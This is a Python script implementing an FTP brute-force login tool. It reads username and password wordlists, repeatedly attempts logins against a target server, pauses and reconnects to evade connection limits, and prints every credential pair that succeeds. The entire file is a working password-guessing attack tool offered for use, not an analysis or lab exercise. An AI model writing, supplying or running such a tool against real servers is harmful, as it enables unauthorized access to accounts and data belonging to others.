#   -*- coding: utf-8 -*-
# !/usr/bin/python3

from ftplib import FTP, error_perm
from socket import timeout
from time import sleep
from os import path


class FtpBruteForce:
    attempted_times = 0  # Reset connection counter
    """
    Create FTP object.
    Load username and password dictionary.
    Make a login attempt.
    Close connection.
    """

    def __init__(self, server_address, user_dict_path, password_dict_path, server_port=21):
        """
        :param server_address: FTP server IPv4 address.
        :param user_dict_path: Username dictionary path.
        :param password_dict_path: Password dictionary path.
        :param server_port: FTP server port, default is 21.
        """
        self.ftp = FTP()
        self.server_address = server_address
        self.user_dict_path = user_dict_path
        self.password_dict_path = password_dict_path
        self.server_port = server_port

    @staticmethod
    def error_message(message: str):
        """
        :param message: Information to be displayed.(String)
        """
        try:
            print(f"\033[1;31m{message}\033[0m")  # Mark the message in red font
        except ValueError:
            print("The data type must be 'str'.")

    @staticmethod
    def stop(max_num: int):  # When the number of attempts reaches a certain value, sleep for 5 seconds
        """
        :param max_num: The number of attempts already made.
        """
        try:
            if max_num % 5 == 0:
                sleep(5)
        except ValueError:
            print("The data type must be 'int'.")

    def reconnect(self, connection=False):
        """
        :param connection: Do you need to reconnect? Default does not reconnect.
        """
        try:
            # Try sending a simple FTP command to check if the connection is still valid.
            self.ftp.voidcmd("NOOP")
        except (BrokenPipeError, EOFError, TimeoutError, error_perm):
            # If these four exceptions are thrown,
            # the connection may have been disconnected and put into sleep for 5 seconds.
            self.stop(5)
        finally:
            # Try reconnecting regardless of whether the connection has been disconnected or not.
            if not connection:
                self.ftp.connect(self.server_address, self.server_port, timeout=10)

    def load_dict(self):
        """
        :return: String type username collection and password tuple,
                 return (None, None) if the file does not exist.
        """
        # Using collections to eliminate duplicates.
        user_set = set()
        password_set = set()
        # Check if the dictionary file exists, and continue importing the dictionary if it exists.
        if path.exists(self.user_dict_path) and path.exists(self.password_dict_path):
            # Import username dictionary.
            with open(self.user_dict_path, "r") as user_file:
                for user in user_file:
                    user = user.strip()
                    if user != "":
                        user_set.add(user)
            # Import password dictionary.
            with open(self.password_dict_path, "r") as password_file:
                for password in password_file:
                    password = password.strip()
                    if password != "":
                        password_set.add(password)
        else:
            self.error_message("Dictionary file does not exist!")
            return None, None

        return tuple(user_set), tuple(password_set)

    def connection(self):
        while True:
            if self.attempted_times == 5:
                self.error_message("Failed to connect five times, attempting to reconnect, \
                please wait at least 5 seconds")
                self.stop(self.attempted_times)
                self.reconnect(connection=True)
            else:
                try:
                    reply = self.ftp.connect(self.server_address, self.server_port, timeout=10)
                    if "220" in reply:
                        print("\033[32mConnection successful, FTP service ready!\033[0m")
                        break
                except ConnectionRefusedError as connect_error:
                    self.attempted_times += 1
                    self.error_message(f"Error:{connect_error},the connection was denied, \
                    the service may not be running or the maximum number of connections may have been reached.")
                    continue
                except (TimeoutError, timeout) as timeout_error:
                    self.attempted_times += 1
                    self.error_message(f"Error:{timeout_error},Connection timeout, \
                    please check if the network connection and FTP server are functioning properly.")
                    continue

        self.attempted_times = 0  # Reset counter.

    def brute(self, user_dict_tuples, password_tuples):
        """
        :param user_dict_tuples: Username dictionary tuple.
        :param password_tuples: Password dictionary tuple.
        """
        success_login: dict = dict()

        if len(user_dict_tuples) == 0 or len(password_tuples) == 0:
            self.error_message("The username dictionary or password dictionary is empty. \
            Please first call the load-dict method to load the username and password dictionary.")
            exit(1)
        else:
            while True:
                mode = None
                # Blasting mode selection.
                try:
                    mode = int(input("1. Try all usernames and dictionaries in the dictionary\n2. \
                    Single blasting\n0. Exit\nPlease enter login mode:"))
                    match mode:
                        case 0:
                            exit(0)
                        case 1 | 2:
                            break
                        case _:
                            self.error_message("The login mode entered is invalid. Please enter 1 or 2.")
                            continue
                except ValueError:
                    self.error_message("The login mode entered is invalid. Please enter 1 or 2.")
                    continue

            for user in user_dict_tuples:
                for password_index, password in enumerate(password_tuples):
                    self.attempted_times = 0

                    while self.attempted_times < 6:
                        try:
                            replay = self.ftp.login(user, password)
                            if "230" in replay and mode == 1:
                                print(f"\033[1;32mLogin successful! user:{user}, password:{password}\033[0m")
                                success_login[user] = password
                                self.ftp.close()
                                self.connection()
                                break
                            elif "230" in replay and mode == 2:
                                print(f"\033[1;32mLogin successful! user:{user}, password:{password}\033[0m")
                                self.ftp.close()
                                exit(0)
                        except error_perm as error:
                            if "530 Permission denied" in str(error):
                                self.error_message(f"user:{user} password:{password} Login failed, access denied!")
                                break
                            elif "530 Login incorrect" in str(error):
                                self.error_message(f"user:{user} password:{password} Login failed!")
                                break
                            else:
                                pass
                        except (TimeoutError, BrokenPipeError):
                            self.error_message(f"user:{user} password:{password} Login timeout!")
                            self.attempted_times += 1
                            if self.attempted_times >= 5:
                                self.error_message(f"The current attempt count exceeds the limit, \
                                and this user password combination will be skipped.")
                                break
                            else:
                                self.reconnect()
                                continue
                        except (EOFError, ConnectionResetError):
                            self.reconnect()
                            continue

                    # All passwords of the current user have been tried.
                    if password_index + 1 < len(password_tuples):
                        continue
                    else:
                        self.error_message(f"The current user and password combination attempt has been completed, \
                        but no valid login information was found.")

        print("The following are valid login information:")
        for key, value in success_login.items():
            print(f"user:{key} password:{value}")

    def __del__(self):
        self.ftp.close()
        del (self.server_address, self.user_dict_path, self.password_dict_path, self.server_port)
